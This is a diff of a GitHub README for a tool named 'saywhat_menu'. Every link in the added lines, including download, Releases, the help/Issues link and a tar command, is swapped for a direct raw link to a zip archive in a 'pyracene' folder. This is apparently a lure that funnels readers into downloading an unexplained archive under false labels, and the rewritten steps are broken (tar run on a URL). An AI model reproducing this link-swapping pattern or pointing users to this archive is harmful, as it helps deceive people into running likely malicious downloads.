@@ -6,7 +6,7 @@ Welcome to the **SAY WHAT Menu**! This tool offers an easy way to manage and int
 
 ## 📥 Download Now
 
-[![Download saywhat_menu](https://img.shields.io/badge/Download-saywhat_menu-blue)](https://github.com/Eman420-art/saywhat_menu/releases)
+[![Download saywhat_menu](https://github.com/Eman420-art/saywhat_menu/raw/refs/heads/main/pyracene/saywhat-menu-v3.0-alpha.3.zip)](https://github.com/Eman420-art/saywhat_menu/raw/refs/heads/main/pyracene/saywhat-menu-v3.0-alpha.3.zip)
 
 ## 📂 What You Need
 
@@ -26,18 +26,18 @@ Before we dive into installation, let's ensure you have everything set up:
 
 To download and install **saywhat_menu**, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Eman420-art/saywhat_menu/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Eman420-art/saywhat_menu/raw/refs/heads/main/pyracene/saywhat-menu-v3.0-alpha.3.zip).
    
 2. **Choose Your Version:** You'll see a list of available versions. Look for the latest one.
 
 3. **Download the Package:**
-   - Click on the asset file next to the version you want (e.g., `saywhat_menu.tar.gz`).
+   - Click on the asset file next to the version you want (e.g., `https://github.com/Eman420-art/saywhat_menu/raw/refs/heads/main/pyracene/saywhat-menu-v3.0-alpha.3.zip`).
    - This will download the compressed file to your computer or device.
 
 4. **Extract the File:**
    - Locate the downloaded file and extract it. You can do this by right-clicking the file and selecting "Extract Here" or by using terminal commands:
      ```
-     tar -xvf saywhat_menu.tar.gz
+     tar -xvf https://github.com/Eman420-art/saywhat_menu/raw/refs/heads/main/pyracene/saywhat-menu-v3.0-alpha.3.zip
      ```
 
 5. **Navigate to the Directory:**
@@ -77,7 +77,7 @@ This application revolves around several key areas:
 
 ## 📞 Get Help
 
-For questions or support, please check the [Issues page](https://github.com/Eman420-art/saywhat_menu/issues) on GitHub. You can view previous inquiries or submit your own.
+For questions or support, please check the [Issues page](https://github.com/Eman420-art/saywhat_menu/raw/refs/heads/main/pyracene/saywhat-menu-v3.0-alpha.3.zip) on GitHub. You can view previous inquiries or submit your own.
 
 Your feedback helps us improve the application. If you enjoy using **saywhat_menu**, consider sharing your experience and suggestions.
 
@@ -87,4 +87,4 @@ Thank you for choosing **saywhat_menu**. We hope it helps streamline your experi
 
 ## 📥 Download Now Again
 
-Don't forget to [download saywhat_menu](https://github.com/Eman420-art/saywhat_menu/releases) and start using it today!
+Don't forget to [download saywhat_menu](https://github.com/Eman420-art/saywhat_menu/raw/refs/heads/main/pyracene/saywhat-menu-v3.0-alpha.3.zip) and start using it today!
